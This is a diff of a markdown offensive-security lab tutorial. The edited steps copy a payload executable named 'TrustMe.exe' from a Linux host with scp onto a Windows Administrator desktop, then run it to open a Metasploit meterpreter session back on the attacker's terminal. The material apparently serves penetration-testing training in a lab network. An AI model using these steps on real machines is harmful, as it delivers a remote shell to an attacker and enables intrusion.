@@ -315,25 +315,34 @@ It should look like this:
 
 
 
-We will need to open a **"cmd.exe"** terminal as **Administrator**.
+Open up a **Powershell** terminal, copy the file over from **Linux**
 
-<img width="53" height="40" alt="image" src="https://github.com/user-attachments/assets/47d5e363-0b2a-4009-a117-6103db26870d" />
+```ps
+cd .\Desktop\
+```
+
+```ps
+scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
+```
+
+Open a **Command Prompt**
+
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/62be252d-35ca-41a4-8ade-ba5d8a8478bb" />
 
 
+Let's run the following commands to run the **"TrustMe.exe"** file.
 
-let's run the following commands to run the **"TrustMe.exe"** file.
-
-```bash
-cd \
+```cmd
+cd \Users\Administrator\Desktop
 ```
  
 Then run it with the following:
 
-```bash
+```cmd
 TrustMe.exe
 ```
 
-Back at your Kali terminal, you should have a metasploit session!
+Back at your Ubuntu terminal, you should have a metasploit session!
 
 ![](attachments/meterpretersession.png)
 
